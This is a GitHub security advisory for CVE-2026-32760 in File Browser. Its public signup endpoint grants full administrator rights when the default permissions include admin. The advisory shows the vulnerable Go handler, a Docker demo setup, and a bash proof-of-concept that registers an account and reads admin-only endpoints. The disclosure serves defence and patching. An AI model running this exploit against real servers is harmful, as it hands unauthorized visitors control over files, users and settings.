# [C] File Browser Signup Grants Admin When Default Permissions Include Admin

## Summary
Severity: Critical
Advisory: GHSA-5gg9-5g7w-hm73
CVE: CVE-2026-32760
CWE: CWE-269, CWE-284
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-5gg9-5g7w-hm73
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.62.0

## Details
## Summary
Any unauthenticated visitor can register a full administrator account when self-registration ( signup = true ) is enabled and the default user permissions have perm.admin = true. The signup handler blindly applies all default settings - including Perm.Admin - to the
new user without any server-side guard that strips admin from self-registered accounts.

## Details

**Affected file:** http/auth.go

**Vulnerable code:**
```go
user := &users.User{
    Username: info.Username,
}
d.settings.Defaults.Apply(user)
```

**`settings.UserDefaults.Apply` (settings/defaults.go):**
```go
func (d *UserDefaults) Apply(u *users.User) {
    u.Perm = d.Perm
    ...
}
```

**Settings API permits Admin in defaults (http/settings.go):**
```go
var settingsPutHandler = withAdmin(func(_ http.ResponseWriter, r *http.Request, d *data) (int, error) {
    ...
    d.settings.Defaults = req.Defaults
    ...
})
```

The signupHandler is supposed to create unprivileged accounts for new visitors. It contains no explicit user.Perm.Admin = false reset after Defaults.Apply. If an administrator (intentionally or accidentally) configures defaults.perm.admin = true and also enables signup, every account created via the public registration endpoint is an administrator with full control over all files, users, and server settings.

## Demo Server Setup

```bash
docker run -d --name fb-test \
  -p 8080:80 \
  -v /tmp/fb-data:/srv \
  filebrowser/filebrowser:v2.31.2

ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}')

curl -s -X PUT http://localhost:8080/api/settings \
  -H "X-Auth: $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "signup": true,
    "defaults": {
      "perm": {
        "admin": true,
        "execute": true,
        "create": true,
        "rename": true,
        "modify": true,
        "delete": true,
        "share": true,
        "download": true
      }
    }
  }'
```

## PoC Exploit

```bash
#!/bin/bash
TARGET="http://localhost:8080"

echo "[*] Registering attacker account via public signup endpoint..."
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST "$TARGET/api/signup" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack3r!pass"}')
echo "[*] Signup response: HTTP $STATUS"

echo "[*] Logging in as newly created account..."
ATTACKER_TOKEN=$(curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack3r!pass"}')

echo "[*] Fetching user list with attacker token (admin-only endpoint)..."
curl -s "$TARGET/api/users" \
  -H "X-Auth: $ATTACKER_TOKEN" | python3 -m json.tool

echo ""
echo "[*] Verifying admin access by reading /api/settings..."
curl -s "$TARGET/api/settings" \
  -H "X-Auth: $ATTACKER_TOKEN" | python3 -m json.tool
```

**Expected output:** The attacker's token successfully returns the full user list and server settings - endpoints restricted to Perm.Admin = true users.

## Impact

Any unauthenticated visitor who can reach POST /api/signup obtains a full admin account.
From there, they can:
- List, read, modify, and delete every file on the server
- Create, modify, and delete all other users
- Change authentication method and server settings
- Execute arbitrary commands if enableExec = true

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-5gg9-5g7w-hm73
- https://nvd.nist.gov/vuln/detail/CVE-2026-32760
- https://github.com/filebrowser/filebrowser/commit/a63573b67eb302167b4c4f218361a2d0c138deab
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.62.0
